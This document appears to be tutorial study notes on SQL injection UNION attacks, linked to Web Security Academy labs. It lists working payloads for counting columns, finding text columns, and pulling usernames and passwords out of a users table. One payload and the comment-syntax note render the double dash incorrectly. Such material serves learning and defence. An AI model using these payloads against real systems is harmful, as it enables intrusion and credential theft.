# Retrieving data from other database tables

# Application Query

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

# Attack Payload

```sql
' UNION SELECT username, password FROM users--
```

[SQL injection UNION attacks | Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks)

# Union Attack Requirements

## `UNION` Query

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

## Query Attack

- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

# **Determining the number of columns required in an SQL injection UNION attack**

## `ORDER BY` Payload

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

`The ORDER BY position number 3 is out of range of the number of items in the select list.`

## `UNION SELECT` Payload

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

- 💡 Note
    - The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.
    - On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like: `' UNION SELECT NULL FROM DUAL--`.
    - The payloads described use the double-dash comment sequence `-` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

## Lab

[**Lab: SQL injection UNION attack, determining the number of columns returned by the query**](./lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query.md)

# **Finding columns with a useful data type in an SQL injection UNION attack**

## Probing Attack Payloads

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

`Conversion failed when converting the varchar value 'a' to data type int.`

## Lab

[**Lab: SQL injection UNION attack, finding a column containing text**](./lab-sql-injection-union-attack-finding-a-column-containing-text.md)

# **Using an SQL injection UNION attack to retrieve interesting data**

## Retrieval Payload

```sql
' UNION SELECT username, password FROM users—
```

## Lab

[**Lab: SQL injection UNION attack, retrieving data from other tables**](./lab-sql-injection-union-attack-retrieving-data-from-other-tables.md)

# **Retrieving multiple values within a single column**

## Concatenating Payload

```sql
' UNION SELECT username || '~' || password FROM users--
```

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

## Lab

[**Lab: SQL injection UNION attack, retrieving multiple values in a single column**](./lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column.md)

